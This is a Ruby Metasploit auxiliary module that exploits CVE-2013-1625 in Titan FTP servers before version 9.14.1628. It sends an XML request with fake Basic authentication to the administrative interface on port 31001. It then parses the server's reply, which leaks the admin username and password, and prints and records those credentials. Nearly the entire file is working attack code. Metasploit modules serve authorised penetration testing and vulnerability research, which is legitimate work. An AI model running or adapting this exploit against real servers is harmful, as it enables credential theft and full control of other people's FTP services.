##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Titan FTP Administrative Password Disclosure',
      'Description' => %q{
        On Titan FTP servers prior to version 9.14.1628, an attacker can
      retrieve the username and password for the administrative XML-RPC
      interface, which listens on TCP Port 31001 by default, by sending an
      XML request containing bogus authentication information. After sending
      this request, the server responds with the legitimate username and
      password for the service. With this information, an attacker has
      complete control over the FTP service, which includes the ability to
      add and remove FTP users, as well as add, remove, and modify
      available directories and their permissions.
      },
      'Author'      =>
        [
          'Spencer McIntyre'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-1625' ]
        ]
    )

    register_options([Opt::RPORT(31001)])
  end

  def run_host(ip)
    res = send_request_cgi(
      {
        'uri'       => '/admin.dll',
        'method'    => 'POST',
        'headers'   => {
          'SRT-WantXMLResponses' => 'true',
          'SRT-XMLRequest'       => 'true',
          'Authorization'        => 'Basic FAKEFAKE'
        },
        'data'      => '<SRRequest><SRTarget>DOM</SRTarget><SRAction>GCFG</SRAction><SRServerName/><SRPayload></SRPayload></SRRequest>'
      })
    return if not res

    if res.code == 400
      vprint_status("#{ip}:#{datastore['RPORT']} - Server Responeded 400, It's Likely Patched")
      return
    elsif res.code != 200
      vprint_status("#{ip}:#{datastore['RPORT']} - Server Responeded With An Unknown Response Code Of #{res.code}")
      return
    end

    xml_data = res.body.strip
    resp_root = REXML::Document.new(xml_data).root

    srresponse = resp_root.elements.to_a("//SRResponse")[0]
    srdomainparams = srresponse.elements.to_a("//SRDomainParams")[0]

    info = {}
    srdomainparams.elements.each do |node|
      case node.name
        when "DomainName"
          info[:domain] = Rex::Text.uri_decode(node.text)
        when "BaseDataDir"
          info[:basedir] = Rex::Text.uri_decode(node.text)
        when "CreationDate"
          info[:username] = Rex::Text.uri_decode(node.text)
        when "CreationTime"
          info[:password] = Rex::Text.uri_decode(node.text)
      end
    end

    if (info[:username] and info[:password])
      if (info[:domain] and info[:basedir])
        print_good("#{ip}:#{datastore['RPORT']} - Domain: #{info[:domain]}")
        print_good("#{ip}:#{datastore['RPORT']} - Base Directory: #{info[:basedir]}")
      end
      print_good("#{ip}:#{datastore['RPORT']} - Admin Credentials: '#{info[:username]}:#{info[:password]}'")
      report_cred(
        ip: ip,
        port: datastore['RPORT'],
        user: info[:username],
        password: info[:password],
        service_name: 'ftp'
      )
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
